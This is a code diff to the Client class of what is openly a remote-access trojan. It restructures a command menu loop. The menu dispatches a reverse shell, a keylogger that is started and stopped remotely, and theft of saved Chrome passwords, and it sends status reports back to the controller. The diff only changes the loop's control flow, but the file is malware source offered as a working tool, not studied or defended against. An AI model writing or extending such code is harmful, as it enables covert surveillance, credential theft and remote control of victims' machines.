@@ -56,34 +56,32 @@ class Client:
         3. Gets a reverse shell from client to server
         """
         
-        while 1:
-            choice = self.open_menu()
+        choice = self.open_menu()
+        
+        if choice == 1:
+            self.shell.get_shell()
             
-            if choice == 1:
-                self.shell.get_shell()
-                
-            elif choice == 2:
-                self.keylogger.start_log()
-                self.send_data("\n\nKeylogging started to file '{}'...".format(self.keylog_filename))
-                
-            elif choice == 3:
-                self.keylogger.end_log()
-                self.send_data("\n\nKeylogging stopped...")
+        elif choice == 2:
+            self.keylogger.start_log()
+            self.send_data("\n\nKeylogging started to file '{}'...".format(self.keylog_filename))
+            
+        elif choice == 3:
+            self.keylogger.end_log()
+            self.send_data("\n\nKeylogging stopped...")
 
-            elif choice == 4:
-                self.chrome_pass.get_chrome_pass()
-                self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename))
+        elif choice == 4:
+            self.chrome_pass.get_chrome_pass()
+            self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename))
+        
+        elif choice == 5:
+            #ToDo
+            pass
             
-            elif choice == 5:
-                #ToDo
-                pass
-                
-            elif choice == 6:
-                #ToDo
-                pass
+        elif choice == 6:
+            #ToDo
+            pass
             
-            # Waits 1s
-            sleep(1)
+            
 
     def open_menu(self) -> int:
         """
